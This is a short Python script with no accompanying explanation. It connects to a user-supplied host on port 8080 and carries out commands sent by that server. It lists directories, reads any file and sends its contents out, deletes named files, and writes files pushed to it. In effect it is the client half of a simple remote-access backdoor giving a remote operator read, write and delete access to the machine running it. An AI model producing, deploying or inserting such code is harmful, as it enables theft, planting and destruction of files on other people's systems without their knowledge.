import socket
import os

s = socket.socket()
port = 8080
host = input(str("Enter The Host Name Please :"))
s.connect((host, port))
print("")
print("Connected to The Server successfuly")
print("")

while 1:
    command = s.recv(1024)
    command = command.decode()
    print("command recieved")
    print("")
    if command == "cwd":
        files = os.getcwd()
        files = str(files)
        s.send(files.encode())
        print("command has been executed successfuly...")
        print("")
    elif command == "custom":
        user_input = s.recv(5000)
        user_input = user_input.decode()
        files = os.listdir(user_input)
        files = str(files)
        s.send(files.encode())
        print("")
        print("Command has been executed successfuly")
        print("")
    elif command == "download":
        file_Path = s.recv(5000)
        file_Path = file_Path.decode()
        file = open(file_Path, "rb")
        data = file.read()
        s.send(data)
        print("")
        print("File has been sent successfuly")
        print("")
    elif command == "remove":
        fileanddir = s.recv(6000)
        fileanddir = fileanddir.decode()
        os.remove(fileanddir)
        print("")
        print("Command Has Been Executed Success")
        print("")
    elif command == "send":
        filename = s.recv(6000)
        print(filename)
        new_file = open(filename, "wb")
        data = s.recv(6000)
        print(data)
        new_file.write(data)
        new_file.close()

    else:
        print("eror")
